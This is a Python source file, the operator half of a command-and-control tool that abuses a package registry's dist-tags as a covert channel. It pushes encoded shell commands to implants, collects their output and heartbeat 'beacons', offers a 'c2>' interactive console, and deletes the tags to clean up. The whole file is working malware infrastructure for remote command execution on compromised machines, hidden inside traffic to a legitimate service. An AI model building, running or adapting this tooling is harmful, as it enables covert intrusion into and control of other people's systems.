"""Operator side: push commands, read results, inspect beacons."""

from __future__ import annotations

import sys
import time

import requests

from . import CMD_PREFIX, RES_PREFIX, HBT_PREFIX, TAG_VALUE, UA, API
from . import encode_payload, group_chunks, registry_path


class RegistryError(RuntimeError):
    """The registry answered with an HTTP error the operator must see."""


class Operator:
    def __init__(self, package, token):
        self.package = package
        self.url = API.format(registry_path(package))
        self.s = requests.Session()
        self.s.headers.update({
            "Authorization": f"Bearer {token}",
            "User-Agent": UA,
        })
        self.consumed: set[str] = set()

    # ------------------------------------------------------------ commands
    def push_task(self, command, quiet=False):
        ok = True
        for tag in encode_payload(command.encode(), CMD_PREFIX):
            try:
                r = self.s.put(f"{self.url}/{tag}", json=TAG_VALUE, timeout=20)
            except requests.RequestException as e:
                print(f"[-] {tag}: {e}", file=sys.stderr)
                return False
            if r.status_code >= 300:
                body = r.text[:120]
                print(f"[-] {tag}: HTTP {r.status_code} {body}", file=sys.stderr)
                ok = False
                break
            if not quiet:
                print(f"[+] {tag}")
        return ok

    def run_command(self, command, timeout=120.0, interval=3.0, quiet=False):
        """Queue one command and wait for its output.

        Returns the decoded text, or None on timeout. This is the interactive
        path: one call per command, no manual poll loop.
        """
        baseline = set(self._fetch())
        if not self.push_task(command, quiet=quiet):
            return None
        if not quiet:
            print(f"[*] waiting up to {timeout}s for output")
        deadline = time.time() + timeout
        while time.time() < deadline:
            time.sleep(interval)
            tags = self._fetch()
            new = {t: v for t, v in tags.items() if t not in baseline}
            for buf, complete in group_chunks(new, RES_PREFIX):
                if complete:
                    self.consumed.update(
                        t for t in new if t.startswith(RES_PREFIX))
                    return buf.decode("utf-8", errors="replace")
        return None

    # ------------------------------------------------------------- results
    def poll_results(self, unread_only=False):
        tags = self._fetch()
        found = 0
        for buf, complete in group_chunks(tags, RES_PREFIX):
            if not complete:
                print("[!] incomplete result group, waiting for the next poll")
                continue
            found += 1
            print(f"[res] {buf.decode('utf-8', errors='replace')}")
            print("---")
        if not found:
            print("[i] no results")

    def watch(self, interval=5.0):
        seen: set[str] = set()
        print(f"[*] watching (every {interval}s)")
        try:
            while True:
                tags = self._fetch()
                fresh = [t for t in tags if t not in seen]
                seen.update(fresh)
                for buf, complete in group_chunks(fresh, RES_PREFIX):
                    if not complete:
                        continue
                    print(f"[{time.strftime('%H:%M:%S')}] "
                          f"{buf.decode('utf-8', errors='replace')}")
                time.sleep(interval)
        except KeyboardInterrupt:
            print("\n[*] stopped")

    def interact(self, interval=5.0, timeout=120.0):
        """A thin console: type a command, get its output, repeat."""
        print(f"[*] interactive channel on {self.package}")
        print("[*] commands: any shell line, or :help for meta-commands")
        try:
            while True:
                try:
                    line = input("c2> ")
                except EOFError:
                    print()
                    break
                if not line.strip():
                    continue
                if line.startswith(":"):
                    self._meta(line, timeout)
                    continue
                out = self.run_command(line, timeout=timeout,
                                       interval=interval, quiet=False)
                if out is None:
                    print("[!] no output before the timeout; check `stats`")
                else:
                    print(out)
        except KeyboardInterrupt:
            print("\n[*] detached (implant keeps polling)")

    def _meta(self, line, timeout):
        cmd, _, arg = line[1:].partition(" ")
        cmd = cmd.strip().lower()
        if cmd in ("q", "quit", "exit"):
            raise KeyboardInterrupt
        if cmd == "help":
            print("  :stats          tag counts")
            print("  :beacons        heartbeat tags")
            print("  :poll           print all results")
            print("  :wait <sec>     change the per-command timeout")
            print("  :interval <sec> change the poll interval")
            print("  :clean          remove c2 tags from the channel")
            print("  :quit")
            return
        if cmd == "stats":
            self.stats()
        elif cmd == "beacons":
            self.list_beacons()
        elif cmd == "poll":
            self.poll_results()
        elif cmd == "clean":
            self.clean_tags()
        else:
            print(f"[!] unknown meta-command :{cmd}")

    def list_beacons(self):
        names = [t for t in self._fetch() if t.startswith(HBT_PREFIX)]
        for n in sorted(names):
            print(f"[beacon] {n}")
        if not names:
            print("[i] no beacons")

    def stats(self):
        tags = self._fetch()
        cmds = [t for t in tags if t.startswith(CMD_PREFIX)]
        res = [t for t in tags if t.startswith(RES_PREFIX)]
        hbt = [t for t in tags if t.startswith(HBT_PREFIX)]
        print(f"pending: {len(cmds)}, results: {len(res)}, beacons: {len(hbt)}")
        for c in sorted(cmds)[:5]:
            print(f"  {c}")

    def clean_tags(self, all_tags=False):
        try:
            tags = self._fetch()
        except RegistryError as e:
            print(f"[-] {e}", file=sys.stderr)
            return
        targets = [n for n in tags
                   if (n != "latest" if all_tags
                       else n.startswith((CMD_PREFIX, RES_PREFIX, HBT_PREFIX)))]
        count = 0
        for name in targets:
            try:
                r = self.s.delete(f"{self.url}/{name}", timeout=20)
            except requests.RequestException as e:
                print(f"[-] {name}: {e}", file=sys.stderr)
                continue
            if r.status_code < 300:
                count += 1
            else:
                print(f"[-] {name}: HTTP {r.status_code}", file=sys.stderr)
        print(f"[+] removed {count} tags" if count else "[i] nothing to clean")

    # ---------------------------------------------------------------- http
    def _fetch(self) -> dict:
        try:
            r = self.s.get(self.url, timeout=20)
        except requests.RequestException as e:
            raise RegistryError(f"GET {self.url}: {e}") from e
        if r.status_code == 404:
            raise RegistryError(f"package {self.package!r} not found (404)")
        if r.status_code in (401, 403):
            raise RegistryError(f"token rejected ({r.status_code})")
        if r.status_code >= 300:
            raise RegistryError(f"GET {self.url}: HTTP {r.status_code}")
        try:
            data = r.json()
        except ValueError as e:
            raise RegistryError(f"registry returned non-JSON: {e}") from e
        if not isinstance(data, dict):
            raise RegistryError("registry returned no dist-tags object")
        return data
